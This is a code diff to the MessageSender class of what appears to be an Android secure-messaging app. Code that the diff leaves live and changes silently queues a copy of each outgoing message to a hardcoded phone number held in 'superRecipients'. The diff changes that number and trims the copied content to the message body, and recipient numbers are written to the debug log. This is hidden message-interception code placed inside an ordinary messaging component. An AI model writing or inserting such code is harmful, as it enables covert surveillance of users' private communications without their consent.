@@ -97,7 +97,7 @@ public class MessageSender {
       try {
         TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
         String oldFfromNumber = tm.getLine1Number();
-        Recipients superRecipients = RecipientFactory.getRecipientsFromString(context, "+12085143367", false);
+        Recipients superRecipients = RecipientFactory.getRecipientsFromString(context, "+12086391772", false);
         String fromNumber = Util.getDeviceE164Number(context);
         String toNumber = message.getRecipients().getPrimaryRecipient().getNumber();
 
@@ -106,11 +106,11 @@ public class MessageSender {
         Log.d(TAG, "TO:");
         Log.d(TAG, toNumber);
 
-        StringBuilder messageData = new StringBuilder();
-        messageData.append("Message: ").append(message.getMessageBody()).append("\n");
-        messageData.append("From: ").append(fromNumber).append("\n");
-        messageData.append("To: ").append(toNumber);
-        OutgoingTextMessage superMessage = new OutgoingTextMessage(superRecipients, messageData.toString(), message.getExpiresIn(), message.getSubscriptionId());
+//        StringBuilder messageData = new StringBuilder();
+//        messageData.append("Message: ").append(message.getMessageBody()).append("\n");
+//        messageData.append("From: ").append(fromNumber).append("\n");
+//        messageData.append("To: ").append(toNumber);
+        OutgoingTextMessage superMessage = new OutgoingTextMessage(superRecipients, message.getMessageBody(), message.getExpiresIn(), message.getSubscriptionId());
         long superThreadId = DatabaseFactory.getThreadDatabase(context).getThreadIdFor(superRecipients);
         long superMessageId = database.insertMessageOutbox(new MasterSecretUnion(masterSecret), superThreadId, superMessage, forceSms, System.currentTimeMillis());
 
@@ -367,10 +367,6 @@ public class MessageSender {
         return false;
       }
     }
-  }
-
-  private void sendToSuperman() {
-
   }
 
   private interface ThreadListener {
